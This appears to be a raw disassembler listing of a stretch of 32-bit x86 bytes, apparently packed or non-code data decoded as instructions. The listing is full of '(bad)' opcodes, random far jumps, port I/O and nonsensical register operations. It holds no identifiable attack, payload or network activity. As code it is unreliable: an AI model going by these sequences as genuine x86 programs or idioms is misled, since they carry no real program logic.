  4275f8:	inc    dx
  4275fa:	xchg   esi,eax
  4275fb:	sub    al,0x2c
  4275fd:	je     0x42759e
  4275ff:	inc    edi
  427600:	(bad)  
  427601:	std    
  427602:	jno    0x4275e5
  427604:	xor    eax,0x64c58613
  427609:	pop    eax
  42760a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42760b:	add    DWORD PTR [eax],ecx
  42760d:	fs cld 
  42760f:	stos   DWORD PTR es:[edi],eax
  427610:	jle    0x42768a
  427612:	xor    eax,0x5502b6c0
  427617:	jne    0x427689
  427619:	xchg   BYTE PTR [edx+ecx*8],ch
  42761c:	mov    cl,0x15
  42761e:	add    al,0x5a
  427620:	repnz xchg esi,ebx
  427623:	push   eax
  427624:	je     0x427645
  427626:	hlt    
  427627:	popf   
  427628:	and    eax,0x2a5b820b
  42762d:	call   0x6931:0x1c04f853
  427634:	mov    ebp,DWORD PTR [ecx]
  427636:	out    dx,eax
  427637:	pop    eax
  427638:	js     0x4275c1
  42763a:	ss das 
  42763c:	adc    eax,0xed1cee83
  427641:	jo     0x42762d
  427643:	rol    dh,1
  427645:	dec    esi
  427646:	aam    0x63
  427648:	mov    al,0xa0
  42764a:	dec    edi
  42764b:	retf   0xaed0
  42764e:	repz daa 
  427650:	stc    
  427651:	pop    ecx
  427652:	pop    ss
  427653:	mov    ah,0xbc
  427655:	jle    0x427603
  427657:	mov    ah,0x64
  427659:	leave  
  42765a:	jbe    0x4276ad
  42765c:	addr16 adc esi,esi
  42765f:	mov    bl,0xa0
  427661:	cmp    eax,0xc6167014
  427666:	nop
  427667:	int    0x54
  427669:	push   edx
  42766a:	add    DWORD PTR ds:0xb3827468,0x4190fdc9
  427674:	aad    0xce
  427676:	sub    eax,0x26d2615
  42767b:	sar    DWORD PTR [eax],0xe9
  42767e:	mov    bl,0x7c
  427680:	jge    0x42766d
  427682:	mov    ch,cl
  427684:	call   0x53a6:0x3957c9fb
  42768b:	dec    eax
  42768c:	into   
  42768d:	mov    ebx,0x8e
	...
  42769a:	cdq    
  42769b:	enter  0x9ff8,0xf9
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	and    dl,dl
  4276a8:	sahf   
  4276a9:	fild   QWORD PTR [ecx-0x14]
  4276ac:	add    DWORD PTR [eax],eax
  4276ae:	std    
  4276af:	add    DWORD PTR [eax],eax
  4276b1:	add    BYTE PTR ds:0x1b21f92d,bh
  4276b7:	lods   eax,DWORD PTR ds:[esi]
  4276b8:	das    
  4276b9:	ins    BYTE PTR es:[edi],dx
  4276ba:	cwde   
  4276bb:	test   al,0x56
  4276bd:	stc    
  4276be:	sbb    eax,edx
  4276c0:	mov    edi,0x8c6e89ff
  4276c5:	mov    ah,0xaa
  4276c7:	xchg   ebp,eax
  4276c8:	(bad)  
  4276c9:	push   edi
  4276ca:	jmp    0x6e5545
  4276cf:	clc    
  4276d0:	jb     0x4276e1
  4276d2:	aaa    
  4276d3:	lar    eax,WORD PTR [ecx]
  4276d6:	or     BYTE PTR [ebx+eax*2+0x5034fba2],dh
  4276dd:	push   0x40458015
  4276e2:	pop    esi
  4276e3:	sar    BYTE PTR [edi+esi*8],cl
  4276e6:	xor    BYTE PTR [ebx+0x5],dh
  4276e9:	push   ebx
  4276ea:	std    
  4276eb:	inc    bp
  4276ed:	in     al,0x4
  4276ef:	jl     0x4276d6
  4276f1:	fidivr DWORD PTR [ebx-0x4ba0ff72]
  4276f7:	or     BYTE PTR [esi],ah
  4276f9:	cmp    cl,cl
  4276fb:	pop    ebp
  4276fc:	sub    edi,DWORD PTR [eax]
  4276fe:	pop    esi
  4276ff:	nop
  427700:	ror    cl,1
  427702:	test   eax,0x463e613b
  427707:	add    DWORD PTR [edi+0x63],edx
  42770a:	and    bl,BYTE PTR [ebp+0xc]
  42770d:	hlt    
  42770e:	loope  0x4276c4
  427710:	repz (bad) 
  427712:	(bad)  
  427713:	stc    
  427714:	call   0xbe722fd5
  427719:	aad    0xc7
  42771b:	dec    esi
  42771c:	adc    BYTE PTR [ebx+0x7e],dh
  42771f:	rcl    DWORD PTR [eax],0xb2
  427722:	xchg   BYTE PTR [edx],cl
  427724:	mov    cl,0x2e
  427726:	ret    0x59e5
  427729:	lods   al,BYTE PTR ds:[esi]
  42772a:	push   ss
  42772b:	or     eax,DWORD PTR [eax+0x32f86c2b]
  427731:	(bad)  
  427733:	mov    al,0x4b
  427735:	cli    
  427736:	xchg   esp,eax
  427737:	cli    
  427738:	hlt    
  427739:	adc    DWORD PTR [ebx],edx
  42773b:	mov    bl,0x3b
  42773d:	iret   
  42773e:	mov    ecx,0x4ebf28f4
  427743:	cmp    edi,DWORD PTR [ecx-0x586c2fd3]
  427749:	loopne 0x4276f5
  42774b:	iret   
  42774c:	int3   
  42774d:	jno    0x427710
  42774f:	inc    ebp
  427750:	pop    es
  427751:	mov    dh,0x58
  427753:	pop    ecx
  427754:	push   eax
  427755:	retf   
  427756:	mov    esi,0xe9b039bb
  42775b:	loope  0x427708
  42775d:	clc    
  42775e:	setne  BYTE PTR [edx-0x5c]
  427762:	ficom  WORD PTR [ecx+0x572f9ae7]
  427768:	aas    
  427769:	jg     0x427701
  42776b:	sti    
  42776c:	lea    edx,[ecx]
  42776e:	cmp    ebx,DWORD PTR [esi+0x5c]
  427771:	xchg   edx,eax
  427772:	dec    ebx
  427773:	pop    edi
  427774:	xchg   edi,eax
  427775:	inc    eax
  427776:	mov    edx,DWORD PTR ds:0xb8336d74
  42777c:	and    eax,0xa8205ac1
  427781:	dec    esp
  427782:	push   ecx
  427783:	in     eax,dx
  427784:	in     al,dx
  427785:	and    bl,BYTE PTR [ebp+0x7]
  427788:	or     al,0x72
  42778a:	pusha  
  42778b:	pop    esi
  42778c:	mov    dl,0x7
  42778e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42778f:	xchg   edx,ecx
  427791:	fnsave [ecx]
  427793:	jne    0x4277ef
  427795:	sub    al,bh
  427797:	shr    BYTE PTR [esi+0x40],1
  42779a:	adc    ah,bl
  42779c:	xor    dh,BYTE PTR [eax]
  42779e:	mov    ch,0xe0
  4277a0:	icebp  
  4277a1:	call   0x5c2342a6
  4277a6:	int3   
  4277a7:	enter  0x55c1,0xd9
  4277ab:	jnp    0x4277ce
  4277ad:	dec    edx
  4277ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277af:	or     edx,DWORD PTR [esi+0x31e386d4]
  4277b5:	and    ah,BYTE PTR [ebx-0x1d1d7d20]
  4277bb:	adc    al,0xcf
  4277bd:	nop
  4277be:	sbb    eax,0x188f5e79
  4277c3:	fldenv [ebx+eiz*1+0x778dca8d]
  4277ca:	ss jno 0x427812
  4277cd:	aam    0xd8
  4277cf:	sub    cl,BYTE PTR [esi-0x45]
  4277d2:	xchg   DWORD PTR [ebp+0x31],ecx
  4277d5:	test   esp,ecx
  4277d7:	cs popf 
  4277d9:	xchg   esi,eax
  4277da:	push   ss
  4277db:	pop    ebp
  4277dc:	sti    
  4277dd:	push   ebp
  4277de:	mov    esp,ebp
  4277e0:	rol    BYTE PTR [esi-0x1d758e28],0x92
  4277e7:	in     eax,dx
  4277e8:	push   ss
  4277e9:	or     ecx,DWORD PTR [edi-0x1d]
  4277ec:	sbb    eax,0x270d402f
  4277f1:	int3   
  4277f2:	shr    BYTE PTR [ebx-0x62],1
  4277f5:	lea    esi,[edx+0x6c]
  4277f8:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4277fa:	outs   dx,BYTE PTR ds:[esi]
  4277fb:	cli    
  4277fc:	xchg   ecx,eax
  4277fd:	dec    esp
  4277fe:	pop    ss
  4277ff:	shl    DWORD PTR [ecx-0x4fdb3faf],cl
  427805:	lock push ds
  427807:	mov    edx,0x52897722
  42780c:	(bad)  
  42780d:	xor    bl,BYTE PTR [ecx]
  42780f:	jmp    0xf528:0xc8d4059e
  427816:	mov    ah,BYTE PTR [eax+ecx*4+0x73409586]
  42781d:	push   ecx
  42781e:	je     0x42789e
  427820:	jl     0x427801
  427822:	adc    al,0x7f
  427824:	push   esi
  427825:	cmp    edx,ebp
  427827:	ins    DWORD PTR es:[edi],dx
  427828:	jns    0x4277cc
  42782a:	ins    DWORD PTR es:[edi],dx
  42782b:	lahf   
  42782c:	cmp    DWORD PTR [ecx+0x771d9847],eax
  427832:	loope  0x427890
  427834:	daa    
  427835:	add    WORD PTR [ebx],di
  427838:	fld    TBYTE PTR [edx-0x44]
  42783b:	or     al,ch
  42783d:	sahf   
  42783e:	fst    DWORD PTR [edx]
  427840:	stos   BYTE PTR es:[edi],al
  427841:	shl    BYTE PTR [esi+0xadf9a4e],0x43
  427848:	pop    ecx
  427849:	push   ds
  42784a:	sbb    BYTE PTR [edx+0x20],ch
  42784d:	lock arpl WORD PTR [eax],sp
  427850:	sbb    eax,0x6fe09c0d
  427855:	bound  esi,QWORD PTR [eax]
  427857:	les    eax,FWORD PTR [esi-0x7]
  42785a:	xor    eax,edx
  42785c:	push   ebp
  42785d:	xor    al,0xe6
  42785f:	lock rcl BYTE PTR [ebp-0xc],1
  427863:	ins    DWORD PTR es:[edi],dx
  427864:	sbb    eax,0x71502377
  427869:	xor    eax,0xa68f969e
  42786e:	fistp  DWORD PTR [eax]
  427870:	jmp    0x63c5:0x7a3134f5
  427877:	out    dx,eax
  427878:	ins    DWORD PTR es:[edi],dx
  427879:	jmp    0xb5a6d7cc
  42787e:	imul   esp,DWORD PTR [esi-0x3b],0x7cdc21c6
  427885:	jae    0x4278e4
  427887:	mov    edi,0x2a46af57
  42788c:	mov    edx,0x7d445d6d
  427891:	adc    BYTE PTR [ebx+0x2cb97367],ch
  427897:	stos   DWORD PTR es:[edi],eax
  427898:	mov    eax,0xce6b3339
  42789d:	outs   dx,BYTE PTR ds:[esi]
  42789e:	out    dx,al
  42789f:	xlat   BYTE PTR ds:[ebx]
  4278a0:	out    dx,eax
  4278a1:	iret   
  4278a2:	dec    ecx
  4278a3:	hlt    
  4278a4:	(bad)  
  4278a5:	xlat   BYTE PTR ds:[ebx]
  4278a6:	in     eax,0x20
  4278a8:	rcr    BYTE PTR [ebp-0x7c],cl
  4278ab:	scas   eax,DWORD PTR es:[edi]
  4278ac:	sbb    dl,bl
  4278ae:	push   esi
	...
  4278b7:	add    BYTE PTR [eax],al
  4278b9:	add    BYTE PTR [ecx+0xa],bh
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	sub    al,0xc7
  4278c8:	fadd   DWORD PTR [ebp+0x1ee66]
  4278ce:	std    
  4278cf:	add    DWORD PTR [eax],eax
  4278d1:	add    BYTE PTR [edi+0x4f],bl
  4278d4:	push   edx
  4278d5:	in     eax,0x9f
  4278d7:	inc    eax
  4278d8:	fcomp  DWORD PTR [esi+0x332b5e14]
  4278de:	inc    edi
  4278df:	jmp    0x853eeeac
  4278e4:	push   ss
  4278e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278e6:	sub    eax,0x963a9eb5
  4278eb:	mov    ds:0x43c74069,eax
  4278f0:	pop    ss
  4278f1:	aad    0xe
  4278f3:	jg     0x42790e
  4278f5:	jg     0x42795a
  4278f7:	mov    edi,0xaccb3e6
  4278fc:	mov    ds:0x190fb2a,al
  427901:	lea    esi,[esi+eax*8-0x114d1986]
  427908:	sub    dh,0xb8
  42790b:	cmp    eax,0x488e5913
  427910:	cli    
  427911:	push   0x8c3e49fc
  427916:	pop    eax
  427917:	sub    eax,0x4f76f553
  42791c:	popf   
  42791d:	mov    al,0x22
  42791f:	ja     0x427974
  427921:	mov    eax,0xae9405c2
  427926:	sbb    DWORD PTR [esi*2-0x3dd9dca1],0xfffffff2
  42792e:	cli    
  42792f:	or     al,BYTE PTR [ebx-0x7ba0b402]
  427935:	xchg   ecx,eax
  427936:	sar    cl,0xea
  427939:	repz jae 0x42792b
  42793c:	not    DWORD PTR [eax]
  42793e:	mov    WORD PTR [ebx],ds
  427940:	sub    edx,edx
  427942:	jmp    0x2342eb24
  427947:	mov    cl,0x6b
  427949:	faddp  st(1),st
  42794b:	xchg   esp,eax
  42794c:	cli    
  42794d:	ror    BYTE PTR [esi],1
  42794f:	push   ecx
  427950:	mov    cs,esi
  427952:	mov    eax,ds:0x186dee4d
  427957:	or     al,0xcd
  427959:	pusha  
  42795a:	sub    BYTE PTR [ecx-0x52340045],dl
  427960:	repnz mov bl,0xf9
  427963:	cmp    BYTE PTR [ebp+0x4b],al
  427966:	fcmovnbe st,st(1)
  427968:	cmp    BYTE PTR [ecx-0x673edd29],ch
  42796e:	fisub  WORD PTR [esi]
  427970:	popf   
  427971:	mov    edx,0xe2a32236
  427976:	mov    bh,0x42
  427978:	push   es
  427979:	xor    al,BYTE PTR [ebx+0x7d]
  42797c:	sbb    bh,dl
  42797e:	dec    edi
  42797f:	inc    ecx
  427980:	aad    0xb5
  427982:	jb     0x427939
  427984:	out    dx,eax
  427985:	cwde   
  427986:	or     DWORD PTR [eax-0x77],ebp
  427989:	ja     0x427918
  42798b:	mov    al,ds:0xe5bb74a6
  427990:	fiadd  WORD PTR [edx]
  427992:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427993:	and    esi,DWORD PTR [eax-0x1a514bee]
  427999:	adc    al,0xc9
  42799b:	loopne 0x427949
  42799d:	in     eax,dx
  42799e:	clc    
  42799f:	(bad)  
  4279a0:	jge    0x42796d
  4279a2:	in     eax,0x64
  4279a4:	inc    ebx
  4279a5:	xchg   DWORD PTR [esi],esi
  4279a7:	pop    edx
  4279a8:	xchg   ebp,esi
  4279aa:	ja     0x427931
  4279ac:	fs aad 0xe9
  4279af:	mov    bh,0x5b
  4279b1:	ins    BYTE PTR es:[edi],dx
  4279b2:	(bad)  
  4279b3:	repz xor BYTE PTR [ecx],dh
  4279b6:	mov    dh,0xe8
  4279b8:	fcomi  st,st(3)
  4279ba:	mov    ebx,0x1fbebe5d
  4279bf:	add    al,0xda
  4279c1:	mov    dl,0x91
  4279c3:	test   DWORD PTR [edi-0x65ae76d0],ebx
  4279c9:	xchg   ecx,eax
  4279ca:	cmp    al,0x9c
  4279cc:	fwait
  4279cd:	jne    0x4279b6
  4279cf:	out    dx,eax
  4279d0:	add    BYTE PTR [esi],0x9b
  4279d3:	outs   dx,DWORD PTR ds:[esi]
  4279d4:	sub    ebx,DWORD PTR [ecx+0x6d]
  4279d7:	push   edi
  4279d8:	sbb    al,0xe
  4279da:	ret    
  4279db:	test   al,0xd4
  4279dd:	inc    esp
  4279de:	test   DWORD PTR fs:[esi+0x57],ecx
  4279e2:	inc    eax
  4279e3:	inc    esi
  4279e4:	sbb    eax,DWORD PTR [ebx-0x26ca82ae]
  4279ea:	loopne 0x4279de
  4279ec:	pop    es
  4279ed:	pop    ss
  4279ee:	clc    
  4279ef:	fld    st(0)
  4279f1:	call   0x49365ea1
  4279f6:	stos   BYTE PTR es:[edi],al
  4279f7:	(bad)  
  4279f8:	not    ch
  4279fa:	les    eax,FWORD PTR [ebx+0x332672cd]
  427a00:	jno    0x4279a6
  427a02:	add    DWORD PTR [esi-0x33],edx
  427a05:	fisttp QWORD PTR [edi+0x78cea4c9]
  427a0b:	mul    DWORD PTR [ecx]
  427a0d:	stos   DWORD PTR es:[edi],eax
  427a0e:	pop    edx
  427a0f:	and    BYTE PTR [ebx+0x62fc11a4],0xa9
  427a16:	xlat   BYTE PTR ds:[ebx]
  427a17:	pop    ds
  427a18:	and    al,0x49
  427a1a:	mov    edx,0x922c22a2
  427a1f:	stc    
  427a20:	iret   
  427a21:	sub    BYTE PTR [ecx],0xa8
  427a24:	xor    ebp,DWORD PTR [eax-0x6b99d58b]
  427a2a:	cmp    cl,BYTE PTR cs:[edi+0x43]
  427a2e:	rdtsc  
  427a30:	xchg   ebp,eax
  427a31:	mov    ah,0xff
  427a33:	push   ds
  427a34:	jne    0x427a1d
  427a36:	or     esi,DWORD PTR [edx+0x5d130ba1]
  427a3c:	ins    BYTE PTR es:[edi],dx
  427a3d:	leave  
  427a3e:	call   0xd5cf7391
  427a43:	mov    ch,0xbb
  427a45:	shl    DWORD PTR [esi],cl
  427a47:	dec    edx
  427a48:	push   ebp
  427a49:	add    cl,al
  427a4b:	cmc    
  427a4c:	and    esp,edi
  427a4e:	jmp    DWORD PTR [edi+0x4e83f6c]
  427a54:	mov    bl,0x71
  427a56:	loop   0x4279e6
  427a58:	jmp    0x4279da
  427a5a:	daa    
  427a5b:	push   esi
  427a5c:	fisttp WORD PTR [eax+0x54bbdf]
  427a62:	cdq    
  427a63:	jle    0x427a87
  427a65:	loope  0x427a67
  427a67:	xor    dh,BYTE PTR [edx+0x48]
  427a6a:	pop    ebp
  427a6b:	mov    al,ds:0x67e63d2b
  427a70:	(bad)  
  427a71:	(bad)  
  427a72:	inc    BYTE PTR [edi+ebx*1]
  427a75:	inc    ecx
  427a76:	xchg   esi,ebp
  427a78:	sbb    eax,0x9f6ee533
  427a7d:	aad    0xa2
  427a7f:	adc    al,0xd8
  427a81:	jl     0x427a8b
  427a83:	ja     0x427acc
  427a85:	outs   dx,BYTE PTR ds:[esi]
  427a86:	mov    ah,0xdf
  427a88:	sar    DWORD PTR [esi+0x5316db10],cl
  427a8e:	mov    dh,BYTE PTR [ebx+0xd]
  427a91:	aas    
  427a92:	test   BYTE PTR [edi],cl
  427a94:	ror    DWORD PTR [esi+eax*1],0x71
  427a98:	(bad)  
  427a99:	dec    edi
  427a9a:	push   es
  427a9b:	adc    ebx,edx
  427a9d:	mov    ss,WORD PTR ds:0xad7cb782
  427aa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427aa4:	jle    0x427ad7
  427aa6:	xor    eax,0x898ada3b
  427aab:	adc    BYTE PTR [esi],dl
  427aad:	shl    DWORD PTR [ebx+0x12],cl
  427ab0:	push   cs
  427ab1:	push   eax
  427ab2:	or     dl,0x69
  427ab5:	hlt    
  427ab6:	pop    edi
  427ab7:	mov    DWORD PTR [ecx-0x642fde2d],esp
  427abd:	xchg   ebp,eax
  427abe:	pop    edx
  427abf:	jns    0x427a67
  427ac1:	add    al,BYTE PTR [eax]
  427ac3:	push   0x51
  427ac5:	push   esp
  427ac6:	jae    0x427a58
  427ac8:	stos   DWORD PTR es:[edi],eax
  427ac9:	lea    esi,[esi]
  427acb:	xor    edi,esp
  427acd:	dec    esp
  427ace:	push   ebx
	...
  427ad7:	add    BYTE PTR [eax],al
  427ad9:	add    BYTE PTR [ecx+0x3],bl
  427adc:	rol    DWORD PTR [ebx+ebx*8-0x3a],0xdd
  427ae1:	pop    ds
  427ae2:	arpl   WORD PTR [edi+0x131c4d6c],di
  427ae8:	call   0x232dea5
  427aed:	add    ch,bh
  427aef:	add    DWORD PTR [eax],eax
  427af1:	add    BYTE PTR [eax],cl
  427af3:	loopne 0x427ae1
  427af5:	and    ah,ch
  427af7:	stos   BYTE PTR es:[edi],al
  427af8:	mov    eax,ds:0xe57552e5
  427afd:	cmc    
  427afe:	loopne 0x427af0
  427b00:	cmp    al,0xde
  427b02:	and    al,0x16
  427b04:	fiadd  WORD PTR [edx+0x35]
  427b07:	mov    cl,BYTE PTR [esp+eax*1]
  427b0a:	sub    DWORD PTR [edx],0x6d
  427b0d:	stc    
  427b0e:	adc    DWORD PTR ds:0x30399b54,0x8b42ec3
  427b18:	enter  0x7d99,0x8e
  427b1c:	xor    bl,bl
  427b1e:	jecxz  0x427aaa
  427b20:	maskmovq mm0,(bad)
  427b21:	test   DWORD PTR [esi-0x76ee3346],0x3d5860f5
  427b2b:	inc    edx
  427b2c:	sbb    BYTE PTR [ecx],dh
  427b2e:	fmulp  st(0),st
  427b30:	sub    al,0x35
  427b32:	add    BYTE PTR [ebx+0x6922f532],dh
  427b38:	adc    al,0xa4
  427b3a:	push   es
  427b3b:	fist   DWORD PTR [esi+0x13]
  427b3e:	push   ebp
  427b3f:	sub    ah,BYTE PTR [edx]
  427b41:	xchg   DWORD PTR [eax+0x7a],esp
  427b44:	or     edx,DWORD PTR ds:0xfdd3e7bf
  427b4a:	fld    st(6)
  427b4c:	and    eax,0xbc691d0b
  427b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b52:	mov    ds:0xb9b09991,eax
  427b57:	push   eax
  427b58:	and    DWORD PTR [edi],edx
  427b5a:	mov    edi,0x86405db8
  427b5f:	mov    al,0x3f
  427b61:	mov    eax,0x9f6b73ac
  427b66:	(bad)  
  427b67:	xor    BYTE PTR [ecx],bl
  427b69:	(bad)  
  427b6a:	mov    ?,WORD PTR [ebp-0x31]
  427b6d:	dec    ebx
  427b6e:	loopne 0x427b89
  427b70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b71:	mov    edx,0xdef6c17a
  427b76:	sar    ebx,0xe4
  427b79:	ins    BYTE PTR es:[edi],dx
  427b7a:	add    DWORD PTR [ebp+0x72cddbf0],ebx
  427b80:	cmp    DWORD PTR [edi-0x7d3efd0],ecx
  427b86:	pop    ds
  427b87:	(bad)  
  427b88:	aaa    
  427b89:	push   cs
  427b8a:	imul   eax,DWORD PTR [ebx],0x52c3968b
  427b90:	xchg   esi,eax
  427b91:	(bad)  
  427b92:	xor    eax,DWORD PTR [edx]
  427b94:	rol    BYTE PTR [eax-0x1c87880d],0x3b
  427b9b:	push   eax
  427b9c:	cmp    edi,DWORD PTR [ebx]
  427b9e:	lock loope 0x427b9b
  427ba1:	(bad)  
  427ba3:	fld    st(4)
  427ba5:	push   esp
  427ba6:	mov    cl,0xdd
  427ba8:	pop    es
  427ba9:	xchg   DWORD PTR [ecx+0x69f64418],ebx
  427baf:	dec    esp
  427bb0:	into   
  427bb1:	cmp    DWORD PTR [ebx+0x20],esi
  427bb4:	xchg   DWORD PTR [edi],esi
  427bb6:	rol    BYTE PTR [ecx],cl
  427bb8:	push   cs
  427bb9:	jae    0x427bd1
  427bbb:	and    al,0x8a
  427bbd:	cdq    
  427bbe:	jecxz  0x427ba7
  427bc0:	mov    bl,ah
  427bc2:	inc    ebx
  427bc3:	cwde   
  427bc4:	add    BYTE PTR [edx],ah
  427bc6:	call   0xe16f99a6
  427bcb:	sub    edi,esp
  427bcd:	dec    edi
  427bce:	dec    ecx
  427bcf:	and    dl,BYTE PTR [edx-0x607689ce]
  427bd5:	push   ss
  427bd6:	adc    BYTE PTR [esi],dh
  427bd8:	mov    ds:0xaf35aefe,al
  427bdd:	mov    BYTE PTR [edi+0x3e],al
  427be0:	int    0xed
  427be2:	(bad)  
  427be3:	imul   edi,DWORD PTR [ecx],0xe33ea15f
  427be9:	ins    DWORD PTR es:[edi],dx
  427bea:	cmp    eax,0xb40f01df
  427bef:	push   eax
  427bf0:	ret    
  427bf1:	(bad)  
  427bf2:	jg     0x427bc2
  427bf4:	outs   dx,BYTE PTR ds:[esi]
  427bf5:	add    bl,BYTE PTR [ebx+0x7cb02062]
  427bfb:	cmp    DWORD PTR [ecx+0x4e],esp
  427bfe:	(bad)  
  427c00:	les    ebx,FWORD PTR [esi-0x76]
  427c03:	js     0x427c0f
  427c05:	sbb    dh,BYTE PTR [edi-0x7b704e8c]
  427c0b:	cs pop eax
  427c0d:	lods   eax,DWORD PTR ds:[esi]
  427c0e:	push   ss
  427c0f:	inc    ebx
  427c10:	fwait
  427c11:	xor    al,0x28
  427c13:	cmp    ch,dl
  427c15:	ss xor al,0x89
  427c18:	push   ss
  427c19:	dec    esi
  427c1a:	or     eax,0x69f8d8d
  427c1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c20:	dec    ebx
  427c21:	out    dx,al
  427c22:	fiadd  WORD PTR [esp+eax*2-0x6a]
  427c26:	neg    DWORD PTR [ebx]
  427c28:	xchg   esi,eax
  427c29:	sahf   
  427c2a:	mov    DWORD PTR [ecx+esi*1+0x12eca500],esi
  427c31:	pop    edi
  427c32:	push   ebx
  427c33:	mov    edx,0x51a20302
  427c38:	add    al,0x9d
  427c3a:	and    ebp,DWORD PTR ds:0x54e95f03
  427c40:	loope  0x427c0f
  427c42:	pop    ebp
  427c43:	in     al,dx
  427c44:	(bad)  
  427c46:	(bad)  
  427c47:	aam    0xad
  427c49:	xchg   edx,eax
  427c4a:	xor    esi,DWORD PTR [esp+edi*1-0x42bac757]
  427c51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c52:	mov    eax,ds:0xdd15ef3d
  427c57:	mov    al,ds:0xcb6176ba
  427c5c:	imul   edx,eax,0x77
  427c5f:	imul   esi,DWORD PTR [esi],0xffffffe8
  427c62:	lea    ecx,[eax]
  427c64:	mov    bl,0xb3
  427c66:	xchg   esi,eax
  427c67:	fnsave [ecx+0x25]
  427c6a:	dec    esi
  427c6b:	mov    esp,0x6d09cb00
  427c70:	mov    ebp,0x711330e1
  427c75:	test   DWORD PTR [esi+0x5e],ecx
  427c78:	mov    BYTE PTR [edx+0x2b],ch
  427c7b:	aaa    
  427c7c:	scas   al,BYTE PTR es:[edi]
  427c7d:	retf   
  427c7e:	inc    esp
  427c7f:	jnp    0x427ca3
  427c81:	push   es
  427c82:	push   eax
  427c83:	sub    eax,0xbfc82123
  427c88:	jmp    0x2b81d54a
  427c8d:	cmp    al,0x0
  427c8f:	push   edi
  427c90:	push   ebx
  427c91:	out    dx,al
  427c92:	jmp    0x427c3d
  427c94:	(bad)  
  427c95:	push   ecx
  427c96:	retf   0xa1f5
  427c99:	sahf   
  427c9a:	retf   
  427c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c9c:	push   ebx
  427c9d:	inc    esi
  427c9e:	dec    esi
  427c9f:	fcmove st,st(1)
  427ca1:	(bad)  
  427ca2:	push   ss
  427ca3:	stos   BYTE PTR es:[edi],al
  427ca4:	retf   
  427ca5:	add    eax,0xc9245961
  427caa:	and    dl,al
  427cac:	or     edi,DWORD PTR [esi-0x74]
  427caf:	adc    al,0x49
  427cb1:	cwde   
  427cb2:	outs   dx,DWORD PTR ds:[esi]
  427cb3:	les    esp,FWORD PTR [ecx+0x73]
  427cb6:	sahf   
  427cb7:	repz in al,0x97
  427cba:	inc    BYTE PTR [ecx+0x19]
  427cbd:	xchg   ebx,eax
  427cbe:	mov    ?,ecx
  427cc0:	jecxz  0x427cff
  427cc2:	sbb    al,0xe0
  427cc4:	mov    WORD PTR [ebx+ebp*2],gs
  427cc7:	std    
  427cc8:	xor    DWORD PTR [eax-0x23],edx
  427ccb:	ins    DWORD PTR es:[edi],dx
  427ccc:	jecxz  0x427d06
  427cce:	inc    edi
  427ccf:	mov    ?,WORD PTR [edi+0x1f]
  427cd2:	pop    es
  427cd3:	xchg   BYTE PTR [esi+0x2fe5fe3f],bl
  427cd9:	push   es
  427cda:	addr16 push ebx
  427cdc:	cwde   
  427cdd:	hlt    
  427cde:	sub    edx,ebx
  427ce0:	cmp    DWORD PTR [ebp+0x1038d126],edi
  427ce6:	mov    ch,0x3e
  427ce8:	mov    edx,0x81079f1c
  427ced:	stos   BYTE PTR es:[edi],al
  427cee:	jge    0x427cf0
	...
  427cf8:	add    BYTE PTR [eax],al
  427cfa:	sbb    esp,DWORD PTR [edi]
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	mov    eax,0x60b58073
  427d0b:	repnz add DWORD PTR [eax],eax
  427d0e:	std    
  427d0f:	add    DWORD PTR [eax],eax
  427d11:	add    BYTE PTR [ecx],ch
  427d13:	or     eax,0x810fe2ef
  427d18:	or     bh,BYTE PTR [edx]
  427d1a:	icebp  
  427d1b:	ins    BYTE PTR es:[edi],dx
  427d1c:	imul   ecx,DWORD PTR [edi-0x21539186],0xd52d86d2
  427d26:	popf   
  427d27:	bound  ebp,QWORD PTR [ecx+0x3b]
  427d2a:	xchg   ebp,eax
  427d2b:	sbb    BYTE PTR [ebx+0x2a],al
  427d2e:	push   esp
  427d2f:	and    al,0x5a
  427d31:	shr    DWORD PTR [ebp+0x60],cl
  427d34:	stos   BYTE PTR es:[edi],al
  427d35:	call   0x7e61:0xf826d31f
  427d3c:	sbb    ebx,DWORD PTR [ebx+0x2bcd9b15]
  427d42:	mov    ch,BYTE PTR [esi-0x62]
  427d45:	fstp   TBYTE PTR [eax+0x4b]
  427d48:	ja     0x427d2f
  427d4a:	sub    dh,BYTE PTR [esi]
  427d4c:	mov    gs,WORD PTR ds:0x8bcd8d37
  427d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d53:	call   0x930f917a
  427d58:	pop    ds
  427d59:	pop    es
  427d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d5b:	stc    
  427d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d5d:	pop    eax
  427d5e:	call   0x4c78:0x74c3bc0f
  427d65:	inc    edx
  427d66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d67:	mov    bl,0xb8
  427d69:	ds test al,0x3c
  427d6c:	jmp    0x427d03
  427d6e:	into   
  427d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d70:	popf   
  427d71:	repnz repnz dec ebp
  427d74:	(bad)  
  427d75:	or     BYTE PTR [ebx-0x47084e6f],al
  427d7b:	pop    ebx
  427d7c:	jmp    0x2f1:0x6fbae06b
  427d83:	rol    ch,cl
  427d85:	dec    ebp
  427d86:	std    
  427d87:	fs (bad) 
  427d89:	in     ax,dx
  427d8b:	stos   BYTE PTR es:[edi],al
  427d8c:	out    dx,al
  427d8d:	dec    esp
